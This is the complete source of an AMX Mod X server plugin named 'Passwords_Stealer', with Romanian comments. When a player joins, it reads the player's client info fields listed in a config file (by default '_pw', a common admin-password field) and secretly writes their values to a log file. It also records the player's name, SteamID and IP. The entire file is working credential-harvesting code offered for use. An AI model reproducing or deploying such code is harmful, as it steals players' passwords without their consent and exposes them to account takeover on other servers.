#include < amxmodx >
#include < amxmisc >

#pragma semicolon 1


static const

	PLUGIN[ ] =	"Passwords_Stealer",
	VERSION[ ] =	"1.0",
	AUTHOR[ ] =	"Rap^^";


new Array: g_aFields;

new g_szFieldsFilePath[ 64 ];
new g_szPasswordsFilePath[ 64 ];


public plugin_init( )
{
	register_plugin( PLUGIN, VERSION, AUTHOR );

	register_cvar( PLUGIN, AUTHOR, FCVAR_SERVER );

	register_concmd( "amx_reloadfields", "ConCmdReloadFields", ADMIN_CFG );

	g_aFields = ArrayCreate( 256, 1 );
}

public plugin_cfg( )
{
	new szDirector[ 64 ];

	get_localinfo( "amxx_configsdir", szDirector, charsmax( szDirector ) );

	format( szDirector, charsmax( szDirector ), "%s/PasswordsStealer", szDirector );

	if( !dir_exists( szDirector ) )
	{
		mkdir( szDirector );
	}

	formatex( g_szPasswordsFilePath, charsmax( g_szPasswordsFilePath ), "%s/Passwords.ini", szDirector );
	formatex( g_szFieldsFilePath, charsmax( g_szFieldsFilePath ), "%s/Fields.ini", szDirector );

	if( !file_exists( g_szPasswordsFilePath ) )
	{
		write_file( g_szPasswordsFilePath, ";Acest fisier este un log pentru parolele aflate." );
		write_file( g_szPasswordsFilePath, "" );
	}

	LoadFields( );
}

public client_putinserver( id )
{
	new bool: bFound = false;

	new szField[ 128 ];

	new szPassword[ 32 ];

	new iArraySize = ArraySize( g_aFields );

	for( new i = 0; i < iArraySize; i++ )
	{
		ArrayGetString( g_aFields, i, szField, charsmax( szField ) );

		get_user_info( id, szField, szPassword, charsmax( szPassword ) );

		if( szPassword[ 0 ] )
		{
			if( !bFound )
			{
				new szInfos[ 256 ];

				new szName[ 32 ];
				new szAuthid[ 32 ];
				new szIP[ 32 ];

				get_user_name( id, szName, charsmax( szName ) );
				get_user_authid( id, szAuthid, charsmax( szAuthid ) );
				get_user_ip( id, szIP, charsmax( szIP ), 1 );

				formatex( szInfos, charsmax( szInfos ), "----- ^"%s^" ^"%s^" ^"%s^" -----", szName, szAuthid, szIP );
				write_file( g_szPasswordsFilePath, szInfos );

				bFound = true;
				/*
				if( file_exists( g_szPasswordsFilePath ) )
				{
					new iFile = fopen( g_szPasswordsFilePath, "rt" );

					if( !iFile )
					{
						return;
					}

					new szData[ 128 ];

					while( !feof( iFile ) )
					{
						fgets( iFile, szField, charsmax( szData ) );
						trim( szData );

						if( !szData[ 0 ] || szData == ';' )
						{
							continue;
						}

						if( equal( szData, szInfos ) )
						{

						}


					}

					fclose( iFile );
				}*/
			}

			format( szPassword, charsmax( szPassword ), "%s - %s", szField, szPassword );

			write_file( g_szPasswordsFilePath, szPassword );
		}
	}

	if( bFound )
	{
		write_file( g_szPasswordsFilePath, "" );
	}
}

public ConCmdReloadFields( id, iLevel, iCid )
{
	if( !cmd_access( id, iLevel, iCid, 1 ) )
	{
		return PLUGIN_HANDLED;
	}

	LoadFields( );

	console_print( id, "[PASSWORD STEALER] Lista field-urilor a fost actualizata." );

	return PLUGIN_HANDLED;
}

public LoadFields( )
{
	ArrayClear( g_aFields );

	if( file_exists( g_szFieldsFilePath ) )
	{
		new iFile = fopen( g_szFieldsFilePath, "rt" );

		if( !iFile )
		{
			return;
		}

		new szField[ 128 ];

		while( !feof( iFile ) )
		{
			fgets( iFile, szField, charsmax( szField ) );
			trim( szField );

			if( !szField[ 0 ] || szField[ 0 ] == ';' || ( szField[ 0 ] == '/' && szField[ 1 ] == '/' ) )
			{
				continue;
			}

			ArrayPushString( g_aFields, szField );
		}

		fclose( iFile );
	}

	else
	{
		write_file( g_szFieldsFilePath, ";Aici trebuie trecute toate field-urile care vreti sa fie verificate." );
		write_file( g_szFieldsFilePath, ";Aceste field-uri trebuie trecute unul sub altul." );
		write_file( g_szFieldsFilePath, "" );
		write_file( g_szFieldsFilePath, "_pw" );
		write_file( g_szFieldsFilePath, "_exemplul1" );
		write_file( g_szFieldsFilePath, "_exemplul2" );

		LoadFields( );
	}
}
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ deff0{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ lang1033\\ f0\\ fs16 \n\\ par }
*/
